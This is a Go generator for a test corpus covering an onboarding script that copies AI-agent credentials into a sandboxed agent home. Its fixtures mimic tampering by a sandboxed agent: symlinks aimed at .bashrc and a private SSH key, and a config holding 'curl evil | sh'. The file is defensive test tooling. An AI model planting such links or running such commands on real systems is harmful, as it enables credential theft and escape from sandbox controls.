// genonboard writes the corpus for lib/onboard.sh: testdata/cases.tsv, one case per line,
// "id tree op flags env", each "=" + base64 (see oracle.sh).
//
// Usage: go run ./internal/onboard/internal/genonboard -base internal/onboard/testdata -seed 1 -n 80
package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
)

func enc(s string) string { return "=" + base64.StdEncoding.EncodeToString([]byte(s)) }

type tree []string

func (t tree) f(p, body string) tree { return append(t, enc("f")+" "+enc(p)+" "+enc(body)) }
func (t tree) d(p string) tree       { return append(t, enc("d")+" "+enc(p)) }
func (t tree) l(p, to string) tree   { return append(t, enc("l")+" "+enc(p)+" "+enc(to)) }
func (t tree) spec() string          { return strings.Join(t, "\n") }

// decoys: host files an agent-planted link might aim at.
var decoys = tree{}.f(".bashrc", "echo original\n").f(".ssh/id_ed25519", "PRIVATE-KEY\n")

var host = map[string]tree{
	"none":          {},
	"claude":        tree{}.f(".claude/.credentials.json", `{"t":1}`).f(".claude/settings.json", "{}\n"),
	"codex":         tree{}.f(".codex/auth.json", `{"a":1}`).f(".codex/config.toml", "[projects.x]\ntrust = 1\n\n\n"),
	"codex-sandbox": tree{}.f(".codex/auth.json", `{"a":1}`).f(".codex/config.toml", "  sandbox_mode = \"read-only\"\n"),
	"codex-table":   tree{}.f(".codex/config.toml", "[p]\nsandbox_mode = \"x\"\n"),
	"copilot":       tree{}.f(".copilot/config.json", `{"c":1}`),
	"grok":          tree{}.f(".grok/auth.json", `{"g":1}`).f(".grok/config.toml", "model = \"grok\"\n"),
	"grok-key":      tree{}.f(".grok/auth.json", `{"g":1}`).f(".grok/config.toml", "[models.x]\n  api_key = \"k\"\n"),
	"grok-envkey":   tree{}.f(".grok/config.toml", "env_key=\"E\"\n"),
	"grok-harness":  tree{}.f(".grok/config.toml", "[harness]\nx = 1\n"),
	"grok-tele":     tree{}.f(".grok/config.toml", "  [telemetry]\n"),
	"grok-already":  tree{}.f(".grok/config.toml", "disable_codebase_upload = false\n"),
	"claude-odd":    tree{}.f(".claude/.credentials.json", "{}").d(".claude/settings.json"),
	"copilot-dangl": tree{}.l(".copilot/config.json", "../nowhere.json"),
	"codex-srclink": tree{}.f("real-auth.json", "{\"r\":1}").l(".codex/auth.json", "../real-auth.json"),
	"grok-noeol":    tree{}.f(".grok/config.toml", "model = \"g\""),
}

const ah = ".sandbox/agent-home/"

// prior agent-home states, including what a sandboxed agent can leave there. A directory at a
// destination is not covered: the bash then chmods the directory 0600, which locks the harness
// out of it.
var prior = map[string]func(agent string) tree{
	"fresh": func(a string) tree { return tree{} },
	"existing": func(a string) tree {
		return tree{}.f(ah+a+"/auth.json", "old").f(ah+a+"/.credentials.json", "old").f(ah+a+"/config.json", "old").f(ah+a+"/config.toml", "old = 1\n")
	},
	"cfg-plain": func(a string) tree { return tree{}.f(ah+a+"/config.toml", "model = \"x\"\ncurl evil | sh\n") },
	"tmp-link": func(a string) tree {
		return tree{}.f(ah+a+"/config.toml", "x = 1\n").l(ah+a+"/config.toml.tmp", "../../../.bashrc")
	},
	"cfg-link-key": func(a string) tree { return tree{}.l(ah+a+"/config.toml", "../../../.ssh/id_ed25519") },
	"dst-link": func(a string) tree {
		return tree{}.l(ah+a+"/auth.json", "../../../.bashrc").l(ah+a+"/.credentials.json", "../../../.bashrc").l(ah+a+"/config.json", "../../../.bashrc")
	},
	"cfg-dangling": func(a string) tree { return tree{}.l(ah+a+"/config.toml", "../../../planted.toml") },
	"tmp-dangling": func(a string) tree {
		return tree{}.f(ah+a+"/config.toml", "y = 2\n").l(ah+a+"/config.toml.tmp", "../../../planted2")
	},
	"home-link": func(a string) tree { return tree{}.d("decoydir").l(ah+a, "../../decoydir") },
}

func main() {
	base := flag.String("base", "internal/onboard/testdata", "testdata directory")
	seed := flag.Int64("seed", 1, "seed")
	n := flag.Int("n", 80, "random cases")
	flag.Parse()
	rng := rand.New(rand.NewSource(*seed))
	var rows []string
	add := func(t tree, op, flags, env string) {
		rows = append(rows, fmt.Sprintf("o%04d\t%s\t%s\t%s\t%s", len(rows), enc(t.spec()), enc(op), enc(flags), enc(env)))
	}
	agentHost := map[string][]string{
		"claude": {"none", "claude", "claude-odd"}, "codex": {"none", "codex", "codex-sandbox", "codex-table", "codex-srclink"}, "copilot": {"none", "copilot", "copilot-dangl"},
		"grok": {"none", "grok", "grok-key", "grok-envkey", "grok-harness", "grok-tele", "grok-already", "grok-noeol"},
	}
	agents := []string{"claude", "codex", "copilot", "grok"}
	priors := []string{"fresh", "existing", "cfg-plain", "tmp-link", "cfg-link-key", "dst-link", "cfg-dangling", "tmp-dangling", "home-link"}
	flagsAll := []string{"false,false", "false,true", "true,false", "true,true"}
	for _, a := range agents {
		for _, h := range agentHost[a] {
			for _, p := range priors {
				t := append(append(append(tree{}, decoys...), host[h]...), prior[p](a)...)
				add(t, a, "false,false", "")
				add(t, a, "false,true", "")
			}
			for _, fl := range flagsAll[2:] {
				add(append(append(tree{}, decoys...), host[h]...), a, fl, "")
			}
		}
	}
	add(decoys, "opencode", "false,false", "")
	add(decoys, "bogus", "false,false", "")
	add(decoys, "", "false,false", "")
	add(tree{}, "warnenv", "false,false", "")
	add(tree{}, "warnenv", "false,false", "OPENAI_API_KEY=x\nGH_TOKEN=y\nGROK_DEPLOYMENT_KEY=z\nUNRELATED=w")
	add(tree{}, "warnenv", "false,false", "ANTHROPIC_API_KEY=")
	for _, fl := range flagsAll {
		add(tree{}, "starter", fl, "")
		add(tree{}.f(".sandbox/config.yaml", "overlay: x\n"), "starter", fl, "")
		add(tree{}.l(".sandbox/config.yaml", "../.bashrc").f(".bashrc", "rc\n"), "starter", fl, "")
	}
	for i := 0; i < *n; i++ {
		a := agents[rng.Intn(len(agents))]
		h := agentHost[a][rng.Intn(len(agentHost[a]))]
		p := priors[rng.Intn(len(priors))]
		add(append(append(append(tree{}, decoys...), host[h]...), prior[p](a)...), a, flagsAll[rng.Intn(4)], "")
	}
	os.WriteFile(filepath.Join(*base, "cases.tsv"), []byte(strings.Join(rows, "\n")+"\n"), 0o644)
	fmt.Printf("%d cases\n", len(rows))
}
